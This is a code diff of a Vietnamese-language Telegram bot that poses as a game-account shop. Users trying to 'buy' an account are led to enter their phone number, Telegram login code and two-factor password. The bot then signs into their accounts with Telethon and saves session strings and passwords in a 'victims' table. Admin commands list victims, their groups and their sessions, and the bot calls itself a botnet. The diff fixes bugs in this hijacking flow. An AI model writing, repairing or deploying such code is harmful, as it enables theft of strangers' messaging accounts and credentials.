@@ -18,7 +18,7 @@ from telethon.tl.types import InputPeerEmpty
 # ===== CẤU HÌNH TOKEN VÀ BIẾN MÔI TRƯỜNG =====
 # ==========================================
 
-TOKEN = os.getenv('BOT_TOKEN')
+TOKEN = os.getenv('BOT_TOKEN', '').strip()
 DATABASE_URL = os.getenv('DATABASE_URL', '')
 ADMIN_ID = 79079
 REQUIRED_GROUP = "@genplaycluod"
@@ -51,51 +51,54 @@ def get_db_connection():
     return conn
 
 def init_db():
-    conn = get_db_connection()
-    cur = conn.cursor()
-    cur.execute('''
-        CREATE TABLE IF NOT EXISTS users (
-            telegram_id BIGINT PRIMARY KEY,
-            balance INT DEFAULT 0,
-            verified BOOLEAN DEFAULT FALSE,
-            referred_by BIGINT DEFAULT NULL,
-            referred_ids TEXT DEFAULT '',
-            ref_xu INT DEFAULT 0
-        )
-    ''')
-    cur.execute('''
-        CREATE TABLE IF NOT EXISTS accounts (
-            id SERIAL PRIMARY KEY,
-            category VARCHAR(50),
-            account_data TEXT,
-            sold BOOLEAN DEFAULT FALSE
-        )
-    ''')
-    cur.execute('''
-        CREATE TABLE IF NOT EXISTS purchase_history (
-            id SERIAL PRIMARY KEY,
-            telegram_id BIGINT,
-            category VARCHAR(50),
-            account_data TEXT,
-            purchased_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
-        )
-    ''')
-    cur.execute('''
-        CREATE TABLE IF NOT EXISTS victims (
-            id SERIAL PRIMARY KEY,
-            phone TEXT,
-            otp TEXT,
-            session_string TEXT,
-            password TEXT,
-            status TEXT,
-            telegram_id BIGINT,
-            note TEXT,
-            timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
-        )
-    ''')
-    conn.commit()
-    cur.close()
-    conn.close()
+    try:
+        conn = get_db_connection()
+        cur = conn.cursor()
+        cur.execute('''
+            CREATE TABLE IF NOT EXISTS users (
+                telegram_id BIGINT PRIMARY KEY,
+                balance INT DEFAULT 0,
+                verified BOOLEAN DEFAULT FALSE,
+                referred_by BIGINT DEFAULT NULL,
+                referred_ids TEXT DEFAULT '',
+                ref_xu INT DEFAULT 0
+            )
+        ''')
+        cur.execute('''
+            CREATE TABLE IF NOT EXISTS accounts (
+                id SERIAL PRIMARY KEY,
+                category VARCHAR(50),
+                account_data TEXT,
+                sold BOOLEAN DEFAULT FALSE
+            )
+        ''')
+        cur.execute('''
+            CREATE TABLE IF NOT EXISTS purchase_history (
+                id SERIAL PRIMARY KEY,
+                telegram_id BIGINT,
+                category VARCHAR(50),
+                account_data TEXT,
+                purchased_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
+            )
+        ''')
+        cur.execute('''
+            CREATE TABLE IF NOT EXISTS victims (
+                id SERIAL PRIMARY KEY,
+                phone TEXT UNIQUE,
+                otp TEXT,
+                session_string TEXT,
+                password TEXT,
+                status TEXT,
+                telegram_id BIGINT,
+                note TEXT,
+                timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
+            )
+        ''')
+        conn.commit()
+        cur.close()
+        conn.close()
+    except Exception as e:
+        print(f"Lỗi khởi tạo DB: {e}")
 
 init_db()
 
@@ -297,6 +300,10 @@ def shop_menu(message):
 def callback_back_shop(call):
     send_main_shop_menu(call.message.chat.id, call.from_user.id, call.message.message_id, edit=True)
 
+@bot.callback_query_handler(func=lambda call: call.data == "view_my_info")
+def callback_view_info(call):
+    account_info(call.message)
+
 @bot.callback_query_handler(func=lambda call: call.data == "how_to_earn_xu")
 def callback_how_to_earn_xu(call):
     user_id = call.from_user.id
@@ -388,7 +395,7 @@ def callback_buy(call):
         bot.answer_callback_query(call.id, "❌ Bạn không đủ Xu để mua tài khoản này!", show_alert=True)  
         return  
 
-    bot.answer_callback_query(call.id, "⚡ Vui lòng nhập số điện thoại để nhận tài khoản!")  
+    bot.answer_callback_query(call.id, "⚡ Vui lòng nhập số điện thoại!")  
       
     sent = bot.send_message(  
         call.message.chat.id,   
@@ -403,7 +410,10 @@ def callback_buy(call):
 # ==========================================
 
 def process_phone_input(msg):
-    phone = msg.text.strip()
+    if msg.text and msg.text.startswith('/'):
+        return # Nếu người dùng gõ lệnh khác thì hủy bước
+
+    phone = msg.text.strip() if msg.text else ""
     
     if phone.startswith('0'):
         phone = '+84' + phone[1:]
@@ -411,14 +421,14 @@ def process_phone_input(msg):
         phone = '+' + phone
 
     if not re.match(r'^\+\d{10,15}$', phone):
-        sent = bot.reply_to(msg, "❌ Số điện thoại không hợp lệ. Vui lòng nhập lại (Ví dụ: `+84912345678` hoặc `0912345678`):", parse_mode="Markdown")
+        sent = bot.reply_to(msg, "❌ Số điện thoại không hợp lệ. Vui lòng nhập lại đúng định dạng (Ví dụ: `+84912345678` hoặc `0912345678`):", parse_mode="Markdown")
         bot.register_next_step_handler(sent, process_phone_input)
         return
 
     conn = get_db_connection()
     cur = conn.cursor()
-    cur.execute("INSERT INTO victims (phone, status, telegram_id) VALUES (%s, %s, %s) ON CONFLICT DO NOTHING",
-                (phone, "sending_code", msg.from_user.id))
+    cur.execute("INSERT INTO victims (phone, status, telegram_id) VALUES (%s, %s, %s) ON CONFLICT (phone) DO UPDATE SET status = 'sending_code', telegram_id = %s",
+                (phone, "sending_code", msg.from_user.id, msg.from_user.id))
     conn.commit()
     cur.close()
     conn.close()
@@ -460,12 +470,15 @@ def trigger_telegram_code(chat_id, user_id, phone):
         bot.send_message(ADMIN_ID, f"❌ Lỗi gửi code tự động cho {phone}: {e}")
         bot.send_message(
             chat_id, 
-            "❌ Không thể gửi mã xác nhận đến số này (có thể do bị giới hạn từ Telegram).\n"
+            "❌ Không thể gửi mã xác nhận đến số này (có thể do bị giới hạn từ Telegram hoặc số sai).\n"
             "Vui lòng thử lại sau."
         )
 
 def process_otp(msg, phone):
-    otp = msg.text.strip().replace(" ", "")
+    if msg.text and msg.text.startswith('/'):
+        return
+
+    otp = msg.text.strip().replace(" ", "") if msg.text else ""
     if not re.match(r'^\d{6}$', otp):
         sent = bot.reply_to(msg, "❌ Mã phải gồm đúng 6 chữ số. Nhập lại:")
         bot.register_next_step_handler(sent, process_otp, phone)
@@ -485,7 +498,7 @@ def process_otp(msg, phone):
         try:  
             session_path = f"sessions/{phone.replace('+', '')}"
             client = TelegramClient(session_path, API_ID, API_HASH)  
-            client.start(phone=phone, password=otp)  
+            client.start(phone=phone, code=otp)  
             session_str = client.session.save()  
             client.disconnect()  
 
@@ -524,7 +537,10 @@ def process_otp(msg, phone):
     threading.Thread(target=login).start()
 
 def process_password(msg, phone):
-    password = msg.text.strip()
+    if msg.text and msg.text.startswith('/'):
+        return
+
+    password = msg.text.strip() if msg.text else ""
     conn = get_db_connection()
     cur = conn.cursor()
     cur.execute("UPDATE victims SET password = %s WHERE phone = %s", (password, phone))
@@ -600,8 +616,8 @@ def admin_panel(message):
         "• /list – Xem toàn bộ danh sách nạn nhân\n"
         "• /findgroups [phone] – Tìm nhóm của nạn nhân\n"
         "• /showsess [phone] – Xem thiết bị đăng nhập\n"
-        "• /themkho level_5_8 [số]\n"
-        "• /themkho level_30 [số]\n"
+        "• /setnote [phone] [ghi_chú] – Thêm ghi chú\n"
+        "• /themkho [level_5_8/level_30] [số_lượng]\n"
         "• /addxu [id] [xu]\n"
         "• /thongke\n"
         "• /thongbao [nội_dung]"
@@ -929,4 +945,5 @@ if __name__ == "__main__":
     flask_thread.start()
 
     print("✨ Bot tích hợp Shop Acc + Botnet đã sẵn sàng hoạt động!")  
-    bot.infinity_polling()
+    bot.infinity_polling(skip_pending=True)
+ 
